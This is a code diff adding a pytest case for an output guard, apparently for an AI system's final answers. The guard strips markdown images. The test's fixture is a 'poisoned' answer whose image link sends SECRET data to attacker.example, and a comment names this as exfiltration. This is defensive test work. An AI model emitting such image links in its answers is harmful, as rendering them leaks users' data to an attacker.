@@ -1,5 +1,6 @@
 import pytest
 
+from security.output_guard import remove_markdown_images
 from security.stream_masker import StreamMasker, mask_sensitive_text
 
 
@@ -69,3 +70,13 @@ def test_plain_text_passes_through_unchanged():
     assert stream(["Certificate ", "expiry caused ", "the outage."]) == (
         "Certificate expiry caused the outage."
     )
+
+
+def test_markdown_images_are_removed_from_a_final_answer():
+    # Exfiltration: rendering this image would send data to the attacker's server.
+    poisoned_answer = "See ![status](https://attacker.example/collect?data=SECRET) for details."
+
+    cleaned_answer = remove_markdown_images(poisoned_answer)
+
+    assert "attacker.example" not in cleaned_answer
+    assert "[image removed]" in cleaned_answer
